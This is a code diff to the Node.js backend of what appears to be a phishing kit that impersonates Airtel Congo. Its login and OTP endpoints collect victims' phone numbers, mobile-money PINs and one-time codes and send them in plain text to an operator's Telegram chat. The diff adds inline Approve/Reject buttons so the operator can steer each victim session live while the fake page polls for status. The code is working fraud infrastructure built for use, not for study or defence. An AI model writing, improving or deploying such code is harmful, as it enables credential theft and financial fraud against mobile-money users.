@@ -21,11 +21,9 @@ if (!publicUrl && process.env.RENDER_EXTERNAL_URL) {
 }
 
 // ---------- In-memory sessions ----------
-// sessionId -> { plan, amount, unit, validity, price, phone, pin, status, createdAt, message }
 const sessions = new Map();
-const SESSION_TTL_MS = 15 * 60 * 1000; // 15 minutes
+const SESSION_TTL_MS = 15 * 60 * 1000;
 
-// Sweep expired sessions every minute
 setInterval(() => {
   const now = Date.now();
   for (const [id, s] of sessions) {
@@ -33,40 +31,64 @@ setInterval(() => {
   }
 }, 60 * 1000);
 
-// ---------- Telegram ----------
-async function tgSend(text, retries = 3) {
-  if (!BOT_TOKEN || !CHAT_ID) {
-    console.warn('⚠️  Telegram env missing — cannot send');
-    return false;
+// ---------- Telegram helpers ----------
+async function tgCall(method, payload, retries = 3) {
+  if (!BOT_TOKEN) {
+    console.warn('⚠️  Telegram token missing');
+    return null;
   }
-
   for (let i = 0; i < retries; i++) {
     try {
-      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text,
-          parse_mode: 'HTML',
-          disable_web_page_preview: true
-        })
+        body: JSON.stringify(payload)
       });
       const data = await res.json();
       if (!data.ok) {
-        console.error(`Telegram error (attempt ${i + 1}):`, data);
-        if (data.error_code === 400 || data.error_code === 401) break;
+        console.error(`Telegram ${method} error (attempt ${i + 1}):`, data);
+        if (data.error_code === 400 || data.error_code === 401) return data;
       } else {
-        console.log('✅ Telegram message sent');
-        return true;
+        return data;
       }
     } catch (err) {
-      console.error(`Telegram send failed (attempt ${i + 1}):`, err.message);
+      console.error(`Telegram ${method} failed (attempt ${i + 1}):`, err.message);
       if (err.cause) console.error('  Cause:', err.cause.code, '—', err.cause.message);
       if (i < retries - 1) await new Promise(r => setTimeout(r, 1000 * (i + 1)));
     }
   }
+  return null;
+}
+
+async function tgSend(text, reply_markup) {
+  if (!CHAT_ID) {
+    console.warn('⚠️  Telegram chat id missing');
+    return false;
+  }
+  const payload = {
+    chat_id: CHAT_ID,
+    text,
+    parse_mode: 'HTML',
+    disable_web_page_preview: true
+  };
+  if (reply_markup) payload.reply_markup = reply_markup;
+
+  const data = await tgCall('sendMessage', payload);
+  if (data && data.ok) {
+    console.log('✅ Telegram message sent');
+    return true;
+  }
   return false;
+}
+
+async function tgAnswerCallback(callback_query_id, text) {
+  await tgCall('answerCallbackQuery', { callback_query_id, text, show_alert: false });
+}
+
+async function tgEditMessage(chat_id, message_id, text, reply_markup) {
+  const payload = { chat_id, message_id, text, parse_mode: 'HTML', disable_web_page_preview: true };
+  if (reply_markup) payload.reply_markup = reply_markup;
+  await tgCall('editMessageText', payload);
 }
 
 async function tgSetWebhook() {
@@ -75,18 +97,13 @@ async function tgSetWebhook() {
     return;
   }
   const webhookUrl = `${publicUrl}/api/telegram-webhook`;
-  try {
-    console.log(`🔗 Registering webhook: ${webhookUrl}`);
-    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
-    const data = await res.json();
-    if (data.ok) console.log(`✅ Telegram webhook registered: ${webhookUrl}`);
-    else console.error('❌ Webhook failed:', data);
-  } catch (err) {
-    console.error('❌ Webhook error:', err.message);
-  }
+  console.log(`🔗 Registering webhook: ${webhookUrl}`);
+  const data = await tgCall('setWebhook', { url: webhookUrl });
+  if (data && data.ok) console.log(`✅ Telegram webhook registered: ${webhookUrl}`);
+  else console.error('❌ Webhook failed:', data);
 }
 
-// Helper: format plan block for Telegram
+// ---------- Plan block ----------
 function planBlock(p) {
   return (
     `📦 Forfait: <b>${p.plan || '-'}</b>\n` +
@@ -98,7 +115,6 @@ function planBlock(p) {
 
 // ---------- API routes ----------
 
-// LOGIN — create session, notify Telegram, return sessionId
 app.post('/api/login', async (req, res) => {
   const { plan, amount, unit, validity, price, phone, pin } = req.body || {};
 
@@ -107,45 +123,45 @@ app.post('/api/login', async (req, res) => {
   }
 
   const sessionId = crypto.randomBytes(12).toString('hex');
-  const session = {
+  sessions.set(sessionId, {
     plan, amount, unit, validity, price, phone, pin,
     status: 'pending',
     createdAt: Date.now(),
     message: ''
-  };
-  sessions.set(sessionId, session);
+  });
 
   console.log('📥 Login:', { sessionId, phone, plan, price });
 
-  await tgSend(
+  const text =
     `🇨🇩 <b>Nouvelle Connexion — Airtel Congo</b>\n\n` +
     planBlock({ plan, amount, unit, validity, price }) +
     `📱 Téléphone: <b>+243 ${phone}</b>\n` +
     `🔑 Code PIN: <b>${pin}</b>\n\n` +
-    `🆔 Session: <code>${sessionId}</code>`
-  );
+    `🆔 Session: <code>${sessionId}</code>`;
 
+  const reply_markup = {
+    inline_keyboard: [[
+      { text: '✅ Approuver', callback_data: `approve:${sessionId}` },
+      { text: '❌ Rejeter',  callback_data: `reject:${sessionId}` }
+    ]]
+  };
+
+  await tgSend(text, reply_markup);
   res.json({ ok: true, sessionId });
 });
 
-// STATUS — polling endpoint for the login page
 app.get('/api/status/:sessionId', (req, res) => {
   const { sessionId } = req.params;
   const s = sessions.get(sessionId);
 
-  if (!s) {
-    return res.json({ ok: false, status: 'timeout', message: 'Session expirée.' });
-  }
-
-  if (Date.now() - s.createdAt > SESSION_TTL_MS) {
-    sessions.delete(sessionId);
+  if (!s || Date.now() - s.createdAt > SESSION_TTL_MS) {
+    if (s) sessions.delete(sessionId);
     return res.json({ ok: false, status: 'timeout', message: 'Session expirée.' });
   }
 
   res.json({ ok: true, status: s.status, message: s.message || '' });
 });
 
-// OTP — from otp.html
 app.post('/api/otp', async (req, res) => {
   const { plan, amount, unit, validity, price, phone, otp } = req.body || {};
 
@@ -165,47 +181,78 @@ app.post('/api/otp', async (req, res) => {
   res.json({ ok: true });
 });
 
-// ---------- Admin control (via Telegram) ----------
-// Send /approve <sessionId> or /reject <sessionId> to the bot.
-// Requires the bot to be able to receive updates — the webhook below handles it.
-
+// ---------- Telegram webhook ----------
 app.post('/api/telegram-webhook', async (req, res) => {
   const update = req.body || {};
-  const msg = update.message;
 
+  // 1) Inline button tapped
+  if (update.callback_query) {
+    const cq = update.callback_query;
+    const data = cq.data || '';
+    const [action, sessionId] = data.split(':');
+    const msg = cq.message;
+    const fromId = String(cq.from && cq.from.id);
+
+    console.log('📲 Callback:', { action, sessionId, from: fromId });
+
+    // Security: only the configured admin can act
+    if (fromId !== CHAT_ID) {
+      await tgAnswerCallback(cq.id, 'Non autorisé.');
+      return res.sendStatus(200);
+    }
+
+    const s = sessions.get(sessionId);
+
+    if (!s) {
+      await tgAnswerCallback(cq.id, 'Session introuvable ou expirée.');
+      if (msg) {
+        await tgEditMessage(msg.chat.id, msg.message_id, (msg.text || '') + '\n\n⚠️ <b>Session expirée</b>');
+      }
+      return res.sendStatus(200);
+    }
+
+    if (action === 'approve') {
+      s.status = 'approved';
+      s.message = 'Approuvé';
+      await tgAnswerCallback(cq.id, '✅ Approuvé');
+      if (msg) {
+        await tgEditMessage(
+          msg.chat.id,
+          msg.message_id,
+          (msg.text || '') + `\n\n✅ <b>APPROUVÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`
+        );
+      }
+    } else if (action === 'reject') {
+      s.status = 'rejected';
+      s.message = 'Numéro incorrect. Veuillez vérifier et réessayer.';
+      await tgAnswerCallback(cq.id, '❌ Rejeté');
+      if (msg) {
+        await tgEditMessage(
+          msg.chat.id,
+          msg.message_id,
+          (msg.text || '') + `\n\n❌ <b>REJETÉ</b> — ${new Date().toLocaleTimeString('fr-FR')}`
+        );
+      }
+    } else {
+      await tgAnswerCallback(cq.id, 'Action inconnue.');
+    }
+
+    return res.sendStatus(200);
+  }
+
+  // 2) Text commands (optional fallback)
+  const msg = update.message;
   if (msg && msg.text && String(msg.chat.id) === CHAT_ID) {
     const text = msg.text.trim();
     console.log('📨 Telegram command:', text);
 
-    const approve = text.match(/^\/approve\s+([a-f0-9]{24})$/i);
-    const reject  = text.match(/^\/reject\s+([a-f0-9]{24})$/i);
-
-    if (approve) {
-      const id = approve[1];
-      const s = sessions.get(id);
-      if (s) {
-        s.status = 'approved';
-        s.message = 'Approuvé';
-        await tgSend(`✅ Session <code>${id}</code> approuvée.\n📱 +243 ${s.phone}`);
-      } else {
-        await tgSend(`⚠️ Session <code>${id}</code> introuvable ou expirée.`);
-      }
-    } else if (reject) {
-      const id = reject[1];
-      const s = sessions.get(id);
-      if (s) {
-        s.status = 'rejected';
-        s.message = 'Numéro incorrect. Veuillez vérifier et réessayer.';
-        await tgSend(`❌ Session <code>${id}</code> rejetée.\n📱 +243 ${s.phone}`);
-      } else {
-        await tgSend(`⚠️ Session <code>${id}</code> introuvable ou expirée.`);
-      }
-    } else if (text === '/help' || text === '/start') {
+    if (text === '/help' || text === '/start') {
       await tgSend(
-        `🤖 <b>Commandes admin</b>\n\n` +
-        `/approve &lt;sessionId&gt; — approuver une connexion\n` +
-        `/reject &lt;sessionId&gt; — rejeter une connexion\n` +
-        `/help — afficher cette aide`
+        `🤖 <b>Airtel Congo — Admin</b>\n\n` +
+        `Approuvez ou rejetez chaque connexion via les boutons sous chaque message.\n\n` +
+        `Commandes manuelles (fallback):\n` +
+        `/approve &lt;sessionId&gt;\n` +
+        `/reject &lt;sessionId&gt;`
       );
     }
   } else {
@@ -215,7 +262,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
-// ---------- Serve the static site ----------
+// ---------- Static site ----------
 app.use(express.static(path.join(__dirname, '..')));
 
 app.get('/', (req, res) => {
